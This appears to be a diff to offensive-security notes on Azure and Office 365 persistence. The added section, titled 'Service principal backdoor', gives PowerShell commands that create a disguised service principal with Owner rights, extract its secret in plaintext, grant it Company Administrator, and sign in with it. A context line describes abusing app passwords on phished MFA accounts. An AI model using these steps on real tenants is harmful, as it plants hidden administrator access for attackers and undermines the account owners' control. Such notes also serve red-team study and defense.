@@ -1,4 +1,19 @@
 # Persistence
+## Service principal backdoor
+```
+$spn = New-AzAdServicePrincipal -DisplayName "WebService" -Role Owner
+$spn
+$BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($spn.Secret)
+$UnsecureSecret = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR)
+$UnsecureSecret
+$sp = Get-MsolServicePrincipal -AppPrincipalId <AppID>
+$role = Get-MsolRole -RoleName "Company Administrator"
+Add-MsolRoleMember -RoleObjectId $role.ObjectId -RoleMemberType ServicePrincipal -RoleMemberObjectId $sp.ObjectId
+#Enter the AppID as username and what was returned for $UnsecureSecret as the password in the Get-Credential prompt
+$cred = Get-Credential
+Connect-AzAccount -Credential $cred -Tenant “tenant ID" -ServicePrincipal
+```
+
 ## 0365 App passwords
 - Use case is for apps that can't use MFA
 - Perfect scenario if you phish an account with MFA
